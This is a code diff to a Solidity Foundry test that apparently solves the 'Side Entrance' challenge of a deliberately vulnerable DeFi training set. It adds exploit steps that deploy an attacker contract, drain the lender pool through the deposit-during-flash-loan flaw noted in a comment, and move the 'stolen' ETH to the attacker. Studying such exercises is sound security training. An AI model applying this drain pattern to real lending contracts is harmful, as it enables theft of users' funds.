@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceAttacker} from "../../../src/Solutions/side-entrance/SideEntranceAttacker.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -33,10 +34,22 @@ contract SideEntrance is Test {
     }
 
     function testExploit() public {
+        /*
+            the lendingPool only checks the balance diff, even it was added by deposit
+        */
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        SideEntranceAttacker sideEntranceAttacker = new SideEntranceAttacker(address(sideEntranceLenderPool));
+        sideEntranceAttacker.attack();
+        vm.stopPrank();
 
+        /*transfer ETH to attacker*/
+        vm.startPrank(address(sideEntranceAttacker));
+        uint256 stolenBalance = address(sideEntranceAttacker).balance;
+        payable(attacker).transfer(stolenBalance);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
